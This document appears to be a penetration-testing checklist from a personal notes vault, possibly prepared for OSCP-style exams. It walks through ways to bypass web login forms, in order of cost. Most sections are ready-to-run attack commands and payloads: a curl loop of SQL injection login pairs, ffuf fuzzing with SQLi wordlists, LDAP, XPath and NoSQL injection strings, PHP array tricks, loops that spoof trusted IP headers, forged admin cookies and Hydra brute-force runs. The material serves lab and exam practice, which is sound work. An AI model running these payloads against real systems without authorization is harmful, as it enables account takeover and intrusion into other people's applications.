
Bypass login without valid credentials — via injection payloads, request tampering, or exploiting server-side auth check flaws. Entry from [[Web Attack Checksheet]] sub-block 1.6 on login-form observation.

Sister files: [[Credential Attacks]] (default creds, brute force, stuffing, spray), [[Session Cookie Attacks]] (session/JWT), [[Password Reset Attacks]], [[Registration Attacks]], [[MFA Bypass]].

Ordering: cheap-and-visible first (HTML comments — seconds); injection payload lists (fast, high P on OSCP+ SQLi-vulnerable apps); parameter tampering (fast, defeats naive parsers); direct URL access (fast, defeats routes-only-protected-in-frontend apps); custom header bypass (medium cost, discovery-dependent); HTTP method tampering; case-sensitivity path bypass; HTTP Basic Auth handling.

---

## 1. HTML comment inspection

Devs frequently leave credentials, hints, or debug info in HTML comments on login pages.

`curl -s http://<host>:<port>/<login_path> | grep -oE '<!--[^>]*-->' | head -50`

Also inspect JavaScript files linked from login page (may contain hardcoded creds or test users):

`curl -s http://<host>:<port>/<login_path> | grep -oE '<script[^>]*src=["'"'"'][^"'"'"']+' | grep -oE 'src=["'"'"'][^"'"'"']+' | cut -d'"' -f2`

For each script URL: `curl -s http://<host>:<port>/<script_path> | grep -iE '(password|passwd|user|admin|token|api[_-]?key)'`

Route:

- Credentials found in comments or JS → try directly against login form (feed to [[Credential Attacks]] Section 1 default creds pattern with recovered creds)
- Hints found (URLs, endpoints, test accounts) → note for later, 2
- Nothing useful → 2

---

## 2. SQL / LDAP / XPath injection login bypass

Submit injection payloads as username, password, or both. Bypasses vulnerable login queries.

**Precondition:** login form present. Framework identification (WAC 1.1-1.4) may hint at backend (PHP + MySQL commonly vulnerable; modern frameworks less so).

**Quick manual test — SQL injection classics.** Try each pair via curl or Burp Repeater:

```bash
while IFS=: read -r u p; do
  echo -n "$u | $p → "
  curl -sX POST -d "username=$(printf %s "$u" | jq -sRr @uri)&password=$(printf %s "$p" | jq -sRr @uri)" http://<host>:<port>/<login_path> | grep -q '<fail_signal>' && echo "fail" || echo "SUCCESS"
done << 'EOF'
admin' -- :anything
admin' # :anything
admin'/* :anything
' or 1=1 -- :anything
' or 1=1 # :anything
" or 1=1 -- :anything
' or '1'='1 :anything
' or '1'='1' -- :anything
admin' or '1'='1 :anything
' or 1=1 limit 1 -- :anything
') or ('1'='1 :anything
' union select 1,'admin','password' -- :anything
EOF
```

**Full payload list (large).** HackTricks curated list — try as username field with fixed password `Pass1234`, then swap:

`ffuf -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -X POST -d 'username=FUZZ&password=Pass1234' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads>`

Then reverse (fixed username, fuzz password):

`ffuf -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads>`

**LDAP injection (if backend suspected to use LDAP — Active Directory-integrated apps):**

Try username payloads: `*)(uid=*))(|(uid=*`, `*)(&`, `admin)(&(|(password=*)`, `*)(!(&(|(password=*)`.

**XPath injection (if backend uses XML):**

Try: `' or '1'='1`, `' or count(/*)>0 or '`, `'] | //user/*[contains(*, '`.

Route:

- Any payload produces response without `<fail_signal>` → verify authenticated (visit protected page, check for session) → success → Section 9
- All payloads return `<fail_signal>` → 3

---

## 3. Parameter tampering

Exploit parser quirks in the login form's expected parameters.

**JSON boolean bypass (Node.js / Express commonly).** Change Content-Type to `application/json`, send boolean values:

`curl -sX POST -H 'Content-Type: application/json' -d '{"username":"admin","password":true}' -i http://<host>:<port>/<login_path>`

Variations:

- `{"password":{"$ne":null}}` (NoSQL/MongoDB)
- `{"password":{"$gt":""}}` (NoSQL)
- `{"password":{"password":1}}` (Node.js/mysqljs — makes password comparison always-true)

**Array/dict parameter bypass (PHP loose comparison).**

- `username[]=admin&password=x` (username becomes array)
- `username=admin&password[]=x` (password becomes array — may bypass strcmp)
- `username[]=admin&password[]=x` (both arrays)

**Missing parameter bypass.**

- `username=admin` (password field entirely absent)
- `password=x` (username field entirely absent)
- `username=admin&password=` (password empty)

**HTTP method swap.** Some apps only guard POST; GET or PUT may reach a different handler:

`curl -s -i 'http://<host>:<port>/<login_path>?username=admin&password=x'` (GET)
`curl -sX PUT -d 'username=admin&password=x' -i http://<host>:<port>/<login_path>` (PUT)
`curl -sX TRACE -i http://<host>:<port>/<login_path>` (TRACE — may echo request headers, useful for header enumeration)

**Content-Type mismatch.** Send POST body as JSON but claim form-urlencoded, or vice versa.

Route:

- Any tampered request returns success signal (or non-`<fail_signal>` response) → verify authenticated → Section 9
- All variants fail → 4

---

## 4. Direct URL access to protected pages

Some apps only guard the login page, not the destination. Try common post-login paths directly without authenticating.

```bash
for p in /dashboard /admin /profile /account /home /main /index /portal /console /panel; do
  echo -n "GET $p → "
  curl -s -o /dev/null -w '%{http_code}\n' http://<host>:<port>$p
done
```

For each 200/302 response: `curl -s -i http://<host>:<port>/<path>` — inspect body for auth-gated content (usernames, user data, admin functions) served without login.

**Also test with fake session cookie:**

`curl -s -i -H 'Cookie: session=admin; user=admin; role=admin' http://<host>:<port>/<protected_path>`

Route:

- Protected content served without auth → app trusts client-side auth only → Section 9 (using direct path as authenticated surface)
- All paths return 401/403/redirect-to-login → 5

---

## 5. Custom HTTP header bypass

Some apps trust request headers for auth bypass (typically for internal/proxy contexts).

**Common headers to try:**

```bash
for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "X-Remote-IP: 127.0.0.1" "X-Client-IP: 127.0.0.1" "X-Host: 127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin"; do
  echo -n "$h → "
  curl -s -o /dev/null -w '%{http_code}\n' -H "$h" http://<host>:<port>/<protected_path>
done
```

**Discover custom headers via TRACE method** (if enabled — often disabled but worth checking):

`curl -sX TRACE -H 'X-Test-Header: test' -i http://<host>:<port>/<login_path>`

If TRACE echoes the request with additional headers added by intermediate proxies, those header names may be trusted for auth.

Route:

- Any header combination returns protected content → Section 9 (using header + path as authenticated surface)
- All headers fail → 6

---

## 6. Case-sensitivity path bypass

Server-side path checks that use case-sensitive comparison can be bypassed by mixed-case path variations.

Example vulnerable pattern (PHP): `if( url.substr(0,6) === '/admin')` — case-sensitive `===` comparison misses `/adMin`.

```bash
for p in /admin /Admin /ADMIN /adMin /aDmIn /admin/ /Admin/ /admin.php /Admin.php; do
  echo -n "GET $p → "
  curl -s -o /dev/null -w '%{http_code}\n' http://<host>:<port>$p
done
```

Route:

- One case variant returns 200/302 with content while lowercase returns 401/403 → case-sensitivity bypass confirmed → Section 9
- All variants behave identically → 7

---

## 7. HTTP Basic Auth handling

If server responds with `WWW-Authenticate: Basic` header, target uses HTTP Basic Auth (different from HTML form).

**Detection:**

`curl -s -D - -o /dev/null http://<host>:<port>/<protected_path> | grep -i 'WWW-Authenticate'`

Route:

- `WWW-Authenticate: Basic` header present → this section applies
- No such header → HTTP Basic Auth not in use; skip to 8

**Attack — try default creds via Hydra HTTP Basic module:**

`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt <host> http-get /<protected_path> -t <threads> -V`

Or with enumerated user list (if `users_<host>.txt` populated):

`hydra -L users_<host>.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <host> http-get /<protected_path> -t <threads> -V`

**Manual test with curl:**

`curl -u '<user>:<pass>' -i http://<host>:<port>/<protected_path>`

Route:

- Hydra prints `login:` line → verify manually → Section 9
- All combinations exhausted → 8

---

## 8. Miscellaneous bypass checks

Fast final checks before exhaustion:

- **Robots.txt hints:** already checked in WAC 2.1; if it disallowed `/admin` or similar, try direct access with all above techniques.
- **Backup login page:** `/login.old`, `/login.bak`, `/login2`, `/login_test` — dev versions may skip auth.
- **API endpoint variant:** `/api/login`, `/api/v1/login`, `/api/auth` — API endpoints may have weaker validation than web login.
- **Registration-instead-of-login:** if register form exists (WAC 1.7), create account, use created account's session as authenticated context.

Route:

- Any finding → apply Section 9 or route to [[Registration Attacks]]
- Nothing → Exhaustion

---

## 9. Post-success routing

On verified bypass (session cookie, authenticated content, or direct-access foothold):

1. Log to `route_<ip>.txt`:

    `printf '[Login Bypass Techniques] APPLIED: <technique> on <host>:<port><login_path>\n' >> route_<ip>.txt`

2. Capture session state (cookie, header, path — whatever grants the authenticated context):

    `curl -sX POST -i -d '<payload>' http://<host>:<port>/<login_path> | grep -iE '^(Set-Cookie|Location):'`

3. Route by post-bypass surface:

- Session cookie granted (opaque OR JWT) → re-walk [[Web Attack Checksheet]] sub-blocks 1.6-1.13 authenticated
- JWT-shaped cookie → also consider [[Session Cookie Attacks]] JWT branch for privilege escalation
- Direct RCE via authenticated feature → escalate to [[Linux Privilege Escalation Checksheet]] / [[Windows Privilege Escalation Checksheet]]
- Admin surface reached with upload/exec feature → [[File Upload]] or relevant WAC technique

---

## Exhaustion

Sections 1-8 all exhausted without bypass → continue [[Web Attack Checksheet]] Step 1 walking (next sub-block).
